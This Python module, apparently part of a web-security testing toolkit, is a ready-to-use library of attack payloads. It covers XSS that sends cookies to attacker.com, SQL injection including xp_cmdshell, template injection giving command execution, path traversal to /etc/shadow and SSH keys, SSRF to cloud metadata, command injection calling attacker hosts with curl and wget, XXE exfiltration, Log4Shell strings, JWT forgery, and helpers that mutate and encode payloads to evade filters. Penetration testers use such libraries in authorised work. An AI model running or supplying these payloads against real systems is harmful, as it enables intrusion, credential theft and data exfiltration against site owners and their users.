"""
AEGIS-Advanced Shared Payload Library
========================================
Comprehensive payload collections for all vulnerability classes:
XSS, SQL injection, SSTI, path traversal, LFI/RFI, SSRF, XXE,
command injection, deserialization, JWT, prototype pollution,
open redirect, CRLF, request smuggling, format strings.
Provides encoding, mutation, and context-aware generation.
"""
import os
import re
import base64
import urllib.parse
import random
import itertools
from typing import List, Dict, Optional, Iterator


# ══════════════════════════════════════════════
# XSS Payloads
# ══════════════════════════════════════════════

XSS_BASIC = [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    '</script><script>alert(1)</script>',
    '<body onload=alert(1)>',
    '<iframe src=javascript:alert(1)>',
]

XSS_ADVANCED = [
    '<script>fetch("https://attacker.com/?c="+document.cookie)</script>',
    '<img src=x onerror="fetch(`//attacker.com/?${document.cookie}`)">',
    '<svg><animateTransform onbegin=alert(1)>',
    '<details open ontoggle=alert(1)>',
    '<video><source onerror=alert(1)>',
    '<math><maction actiontype=statusline href=javascript:alert(1)>click</maction></math>',
    '<input autofocus onfocus=alert(1)>',
    '<select onfocus=alert(1) autofocus>',
    '<textarea onfocus=alert(1) autofocus>',
    '<keygen autofocus onfocus=alert(1)>',
    '"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik= onerror=eval(atob(this.id))>',
    "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
]

XSS_DOM = [
    '#<img src=x onerror=alert(1)>',
    '#"><img src=x onerror=alert(1)>',
    'javascript:alert(1)',
    'data:text/html,<script>alert(1)</script>',
]

XSS_CSP_BYPASS = [
    '<base href=//attacker.com>',
    '<script src=//attacker.com/evil.js></script>',
    '<link rel=prefetch href=//attacker.com/?c=1>',
    '<meta http-equiv=refresh content="0;url=//attacker.com">',
]

XSS_POLYGLOTS = [
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//",
    "'\"><img/src/onerror=alert(1)>",
    '"><svg onload=alert(1)>//',
]


# ══════════════════════════════════════════════
# SQL Injection Payloads
# ══════════════════════════════════════════════

SQLI_DETECTION = [
    "'", '"', "1'", "1\"", "1`",
    "1' OR '1'='1", "1\" OR \"1\"=\"1",
    "' OR 1=1--", "' OR 1=1#", "' OR 1=1/*",
    "1 AND 1=1", "1 AND 1=2",
    "1' AND SLEEP(3)--", "1\" AND SLEEP(3)--",
    "1' WAITFOR DELAY '0:0:3'--",
    "1' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--",
]

SQLI_ERROR_BASED = {
    "mysql": [
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
        "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "' AND EXP(~(SELECT * FROM(SELECT user())a))--",
    ],
    "mssql": [
        "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
        "'; EXEC xp_cmdshell('whoami')--",
        "' AND 1=(SELECT 1 FROM openrowset('SQLOLEDB','';'sa';'','select 1'))--",
    ],
    "oracle": [
        "' AND 1=utl_inaddr.get_host_name((SELECT user FROM dual))--",
        "' UNION SELECT null,null,(SELECT user FROM dual) FROM dual--",
        "' AND 1=(SELECT CASE WHEN (1=1) THEN 1/0 ELSE 1 END FROM dual)--",
    ],
    "postgres": [
        "' AND 1=CAST((SELECT version()) AS int)--",
        "'; SELECT pg_sleep(3)--",
        "' AND 1=1;COPY (SELECT '') TO PROGRAM 'id'--",
    ],
}

SQLI_UNION = [
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT 1,2,3--",
    "' UNION SELECT table_name,2,3 FROM information_schema.tables--",
    "' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users'--",
    "' UNION SELECT username,password,3 FROM users--",
]

SQLI_BLIND = [
    "' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--",
    "' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 1 END)=1--",
    "' AND (SELECT 1 WHERE 1=1)=1--",
    "'; SELECT CASE WHEN (username='admin') THEN pg_sleep(3) ELSE pg_sleep(0) END FROM users--",
]

SQLI_SECOND_ORDER = [
    "admin'--",
    "admin'/*",
    "1'; UPDATE users SET password='hacked' WHERE '1'='1",
]


# ══════════════════════════════════════════════
# SSTI Payloads (Server-Side Template Injection)
# ══════════════════════════════════════════════

SSTI_DETECTION = [
    "{{7*7}}",
    "${7*7}",
    "#{7*7}",
    "<%= 7*7 %>",
    "${7*'7'}",
    "{{7*'7'}}",
    "@(7*7)",
]

SSTI_BY_ENGINE = {
    "jinja2": [
        "{{config}}",
        "{{config.items()}}",
        "{{''.__class__.__mro__[2].__subclasses__()}}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        "{%for c in [].__class__.__base__.__subclasses__()%}{%if c.__name__=='Popen'%}{{c(['id'],stdout=-1).communicate()[0]}}{%endif%}{%endfor%}",
    ],
    "twig": [
        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
        "{{['id']|filter('system')}}",
    ],
    "freemarker": [
        '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
        "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
    ],
    "velocity": [
        "#set($x='')##$x.getClass().forName('java.lang.Runtime').getMethod('exec',''.class).invoke($x.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')",
    ],
    "pebble": [
        "{% for i in _''.getClass().getSuperclass().getDeclaredMethods() %}{{ i.getName() }}{% endfor %}",
    ],
}


# ══════════════════════════════════════════════
# Path Traversal / LFI Payloads
# ══════════════════════════════════════════════

LFI_TARGETS = [
    "/etc/passwd",
    "/etc/shadow",
    "/etc/hosts",
    "/etc/hostname",
    "/etc/os-release",
    "/proc/self/environ",
    "/proc/self/cmdline",
    "/proc/version",
    "/var/log/apache2/access.log",
    "/var/log/nginx/access.log",
    "/var/log/auth.log",
    "/root/.bash_history",
    "/root/.ssh/id_rsa",
    "/home/$USER/.ssh/authorized_keys",
    "C:/Windows/win.ini",
    "C:/Windows/System32/drivers/etc/hosts",
    "C:/Windows/System32/config/SAM",
    "C:/inetpub/wwwroot/web.config",
]

LFI_TRAVERSALS = [
    "../" * n + t
    for n in range(1, 9)
    for t in ["etc/passwd", "etc/shadow", "Windows/win.ini"]
] + [
    "....//....//....//etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "..%252F..%252F..%252Fetc%252Fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..\\..\\..\\Windows\\win.ini",
    "..%5c..%5c..%5cWindows%5cwin.ini",
    "/proc/self/fd/0",
    "php://filter/convert.base64-encode/resource=/etc/passwd",
    "php://input",
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOz8+",
    "expect://id",
    "zip://evil.zip%23shell.php",
    "phar://evil.phar/shell.php",
]


# ══════════════════════════════════════════════
# SSRF Payloads
# ══════════════════════════════════════════════

SSRF_INTERNAL = [
    "http://127.0.0.1/",
    "http://localhost/",
    "http://[::1]/",
    "http://0.0.0.0/",
    "http://0177.0000.0000.0001/",
    "http://0x7f000001/",
    "http://2130706433/",
    "http://169.254.169.254/latest/meta-data/",          # AWS metadata
    "http://metadata.google.internal/computeMetadata/v1/",# GCP
    "http://169.254.169.254/metadata/v1/",               # DigitalOcean
    "http://100.100.100.200/latest/meta-data/",          # Alibaba
]

SSRF_PROTOCOLS = [
    "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a",  # Redis via Gopher
    "gopher://127.0.0.1:25/_HELO attacker.com",
    "dict://127.0.0.1:6379/INFO",
    "file:///etc/passwd",
    "ldap://127.0.0.1:389/",
    "tftp://127.0.0.1/id_rsa",
    "ftp://127.0.0.1:21/",
]

SSRF_BYPASS = [
    "http://127.1/",
    "http://127.0.1/",
    "http://①②⑦.⓪.⓪.①/",
    "http://localhost.attacker.com/",
    "http://127.0.0.1.attacker.com/",
    "http://[::ffff:127.0.0.1]/",
    "http://[0:0:0:0:0:ffff:127.0.0.1]/",
    "https://attacker.com@127.0.0.1/",
]


# ══════════════════════════════════════════════
# Command Injection Payloads
# ══════════════════════════════════════════════

CMDI_UNIX = [
    "; id",
    "| id",
    "|| id",
    "&& id",
    "& id",
    "`id`",
    "$(id)",
    "%0Aid",
    "\\nid",
    "; sleep 3",
    "| sleep 3",
    "$(sleep 3)",
    "`sleep 3`",
    "; curl http://attacker.com/$(id)",
    "; wget http://attacker.com/$(id)",
]

CMDI_WINDOWS = [
    "& whoami",
    "| whoami",
    "|| whoami",
    "&& whoami",
    "; whoami",
    "%0Awhoami",
    "^ whoami",
    "`whoami`",
    "$(whoami)",
    "& ping -n 3 127.0.0.1",
    "& timeout 3",
    "& curl http://attacker.com/$(whoami)",
]

CMDI_BLIND = [
    "; sleep 5 #",
    "| sleep 5 #",
    "` sleep 5 `",
    "$(sleep 5)",
    "; ping -c 5 127.0.0.1",
    "& timeout 5",
    "; nslookup attacker.com",
    "; curl http://attacker.com",
]


# ══════════════════════════════════════════════
# XXE Payloads
# ══════════════════════════════════════════════

XXE_BASIC = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>"""

XXE_OOB = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<root>&exfil;</root>"""

XXE_BLIND = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?f=%file;'>">
  %eval;
  %exfil;
]>
<root/>"""

XXE_SVG = """<svg xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg"
     xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200">
  <!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>"""

XXE_PAYLOADS = [XXE_BASIC, XXE_OOB, XXE_BLIND]


# ══════════════════════════════════════════════
# Open Redirect Payloads
# ══════════════════════════════════════════════

OPEN_REDIRECT = [
    "//attacker.com",
    "///attacker.com",
    "////attacker.com",
    "https://attacker.com",
    "//attacker.com/%2e%2e",
    "//attacker%E3%80%82com",
    "/\\attacker.com",
    "//attacker.com#",
    "//attacker.com?",
    "https:attacker.com",
    r"///\attacker.com",
    "javascript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
    "%2f%2fattacker.com",
    "%252f%252fattacker.com",
]


# ══════════════════════════════════════════════
# CRLF Injection Payloads
# ══════════════════════════════════════════════

CRLF_PAYLOADS = [
    "%0d%0aSet-Cookie: crlfinjected=1",
    "%0aSet-Cookie: crlfinjected=1",
    "%0d%0aLocation: https://attacker.com",
    "\r\nSet-Cookie: crlfinjected=1",
    "\nSet-Cookie: crlfinjected=1",
    "%E5%98%8A%E5%98%8DSet-Cookie: crlfinjected=1",
    "%0d%0a%0d%0a<html><script>alert(1)</script>",
    "%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0a",
]


# ══════════════════════════════════════════════
# Prototype Pollution Payloads
# ══════════════════════════════════════════════

PROTOTYPE_POLLUTION = [
    '{"__proto__":{"polluted":"yes"}}',
    '{"constructor":{"prototype":{"polluted":"yes"}}}',
    '__proto__[polluted]=yes',
    'constructor[prototype][polluted]=yes',
    '__proto__.polluted=yes',
    '{"__proto__":{"isAdmin":true}}',
    '{"__proto__":{"toString":"hacked"}}',
]


# ══════════════════════════════════════════════
# JWT Attack Payloads
# ══════════════════════════════════════════════

def jwt_none_bypass(original_token: str) -> List[str]:
    """Generate JWT none-algorithm bypass variants."""
    try:
        header_b64, payload_b64, _ = original_token.split(".")
        # Decode and re-encode with alg:none
        header_raw = base64.b64decode(
            header_b64 + "=" * (-len(header_b64) % 4)).decode()
        import json
        header = json.loads(header_raw)
        variants = []
        for alg in ["none", "None", "NONE", "nOnE"]:
            header_mod = dict(header)
            header_mod["alg"] = alg
            h_enc = base64.urlsafe_b64encode(
                json.dumps(header_mod, separators=(",", ":")).encode()
            ).rstrip(b"=").decode()
            variants.append("{}.{}.".format(h_enc, payload_b64))
        return variants
    except Exception:
        return []


JWT_WEAK_SECRETS = [
    "secret", "password", "123456", "admin", "key",
    "test", "qwerty", "letmein", "jwt_secret", "your-256-bit-secret",
    "jwt-secret", "supersecret"  # noqa: blocked value, "change_this", "", "none",
]


# ══════════════════════════════════════════════
# Deserialization Payloads
# ══════════════════════════════════════════════

DESER_JAVA_MARKERS = [
    b"\xac\xed\x00\x05",                    # Java serialized object magic
    b"rO0AB",                                # Base64 of Java magic
]

DESER_PHP_MARKERS = [
    "O:",    "a:",    "s:",    "i:",         # PHP serialize format
]

DESER_DOTNET_MARKERS = [
    "AAEAAAD",                               # Base64 .NET BinaryFormatter
    b"\x00\x01\x00\x00\x00",
]

LOG4SHELL_PAYLOADS = [
    "${jndi:ldap://attacker.com/x}",
    "${jndi:rmi://attacker.com/x}",
    "${jndi:dns://attacker.com/x}",
    "${${lower:j}ndi:${lower:l}dap://attacker.com/x}",
    "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/x}",
    "${${upper:j}ndi:${upper:l}dap://attacker.com/x}",
    "${j${::-n}di:l${::-d}a${::-p}://attacker.com/x}",
    "${jndi:${lower:l}${lower:d}a${lower:p}://attacker.com/x}",
]

SPRING4SHELL_PAYLOAD = (
    "class.module.classLoader.resources.context.parent.pipeline.first.pattern="
    "%25%7Bprefix%7Di%20java.io.OutputStream%20os%20%3D%20%25%7Bsuffix%7Di"
)


# ══════════════════════════════════════════════
# Host Header Injection
# ══════════════════════════════════════════════

HOST_HEADER_PAYLOADS = [
    "attacker.com",
    "attacker.com:80",
    "attacker.com:443",
    "attacker.com:3128",
    "evil.attacker.com",
    "attacker.com/extra@legit.com",
    "legit.com.attacker.com",
    "127.0.0.1",
    "localhost",
    "169.254.169.254",
]


# ══════════════════════════════════════════════
# Web Cache Poisoning
# ══════════════════════════════════════════════

CACHE_POISON_HEADERS = [
    "X-Forwarded-Host",
    "X-Host",
    "X-Forwarded-Server",
    "X-HTTP-Host-Override",
    "Forwarded",
    "X-Original-URL",
    "X-Rewrite-URL",
    "X-Override-URL",
    "X-Forwarded-For",
    "X-Remote-IP",
    "X-Originating-IP",
    "True-Client-IP",
    "CF-Connecting-IP",
]


# ══════════════════════════════════════════════
# Encoding helpers
# ══════════════════════════════════════════════

def url_encode(payload: str, double: bool = False) -> str:
    encoded = urllib.parse.quote(payload, safe="")
    if double:
        encoded = urllib.parse.quote(encoded, safe="")
    return encoded


def html_encode(payload: str) -> str:
    return (payload
            .replace("&", "&amp;")
            .replace("<", "&lt;")
            .replace(">", "&gt;")
            .replace('"', "&quot;")
            .replace("'", "&#x27;"))


def hex_encode(payload: str) -> str:
    return "".join("\\x{:02x}".format(ord(c)) for c in payload)


def unicode_encode(payload: str) -> str:
    return "".join("\\u{:04x}".format(ord(c)) for c in payload)


def base64_encode(payload: str) -> str:
    return base64.b64encode(payload.encode()).decode()


def null_terminate(payload: str) -> str:
    return payload + "\x00"


def encode_all(payload: str) -> List[str]:
    """Return all standard encodings of a payload."""
    return [
        payload,
        url_encode(payload),
        url_encode(payload, double=True),
        html_encode(payload),
        base64_encode(payload),
        hex_encode(payload),
    ]


# ══════════════════════════════════════════════
# Payload mutation engine
# ══════════════════════════════════════════════

def mutate_xss(base: str = "<script>alert(1)</script>",
               n: int = 20) -> List[str]:
    """Generate mutations of an XSS payload."""
    mutations = [base]
    # Case variations
    mutations.extend([
        base.lower(), base.upper(),
        base.replace("script", "ScRiPt"),
        base.replace("alert", "confirm"),
        base.replace("alert", "prompt"),
        base.replace("alert(1)", "alert`1`"),
        base.replace("alert(1)", "alert(document.domain)"),
    ])
    # Encoding variations
    mutations.extend(encode_all(base))
    # Prefix variations
    for pfx in ['">', "'>", "\">", "\\", "-->"]:
        mutations.append(pfx + base)
    return list(dict.fromkeys(mutations))[:n]  # deduplicate


def mutate_sqli(base: str = "' OR 1=1--",
                n: int = 20) -> List[str]:
    """Generate SQL injection payload mutations."""
    mutations = [base]
    # Comment variations
    for comment in ["--", "#", "/*", "-- -", "/**/"]:
        mutations.append(base.replace("--", comment))
    # Case variations
    mutations.extend([
        base.upper(), base.lower(),
        base.replace("OR", "||"),
        base.replace("AND", "&&"),
        base.replace(" ", "/**/"),
        base.replace(" ", "+"),
        base.replace(" ", "%09"),
        base.replace(" ", "%0a"),
    ])
    return list(dict.fromkeys(mutations))[:n]


# ══════════════════════════════════════════════
# Payload collections by category
# ══════════════════════════════════════════════

ALL_PAYLOADS: Dict[str, List[str]] = {
    "xss":              XSS_BASIC + XSS_ADVANCED,
    "xss_dom":          XSS_DOM,
    "xss_csp":          XSS_CSP_BYPASS,
    "xss_polyglot":     XSS_POLYGLOTS,
    "sqli":             SQLI_DETECTION,
    "sqli_union":       SQLI_UNION,
    "sqli_blind":       SQLI_BLIND,
    "ssti":             SSTI_DETECTION,
    "lfi":              LFI_TRAVERSALS,
    "ssrf":             SSRF_INTERNAL + SSRF_PROTOCOLS,
    "ssrf_bypass":      SSRF_BYPASS,
    "cmdi_unix":        CMDI_UNIX,
    "cmdi_windows":     CMDI_WINDOWS,
    "cmdi_blind":       CMDI_BLIND,
    "crlf":             CRLF_PAYLOADS,
    "open_redirect":    OPEN_REDIRECT,
    "prototype":        PROTOTYPE_POLLUTION,
    "log4shell":        LOG4SHELL_PAYLOADS,
    "host_header":      HOST_HEADER_PAYLOADS,
    "cache_poison":     CACHE_POISON_HEADERS,
}


def get_payloads(category: str) -> List[str]:
    """Get payloads for a category. Returns empty list if unknown."""
    return ALL_PAYLOADS.get(category, [])


def iter_all() -> Iterator[tuple]:
    """Iterate all (category, payload) pairs."""
    for cat, payloads in ALL_PAYLOADS.items():
        for p in payloads:
            yield cat, p


def random_payload(category: str = None) -> str:
    """Return a random payload, optionally from a category."""
    if category:
        pool = get_payloads(category)
    else:
        pool = [p for payloads in ALL_PAYLOADS.values() for p in payloads]
    return random.choice(pool) if pool else ""


__all__ = [
    "XSS_BASIC", "XSS_ADVANCED", "XSS_DOM", "XSS_CSP_BYPASS", "XSS_POLYGLOTS",
    "SQLI_DETECTION", "SQLI_ERROR_BASED", "SQLI_UNION", "SQLI_BLIND", "SQLI_SECOND_ORDER",
    "SSTI_DETECTION", "SSTI_BY_ENGINE",
    "LFI_TARGETS", "LFI_TRAVERSALS",
    "SSRF_INTERNAL", "SSRF_PROTOCOLS", "SSRF_BYPASS",
    "CMDI_UNIX", "CMDI_WINDOWS", "CMDI_BLIND",
    "XXE_BASIC", "XXE_OOB", "XXE_BLIND", "XXE_SVG", "XXE_PAYLOADS",
    "OPEN_REDIRECT", "CRLF_PAYLOADS", "PROTOTYPE_POLLUTION",
    "LOG4SHELL_PAYLOADS", "SPRING4SHELL_PAYLOAD",
    "HOST_HEADER_PAYLOADS", "CACHE_POISON_HEADERS",
    "JWT_WEAK_SECRETS", "jwt_none_bypass",
    "DESER_JAVA_MARKERS", "DESER_PHP_MARKERS",
    "url_encode", "html_encode", "hex_encode", "unicode_encode",
    "base64_encode", "encode_all",
    "mutate_xss", "mutate_sqli",
    "ALL_PAYLOADS", "get_payloads", "iter_all", "random_payload",
]
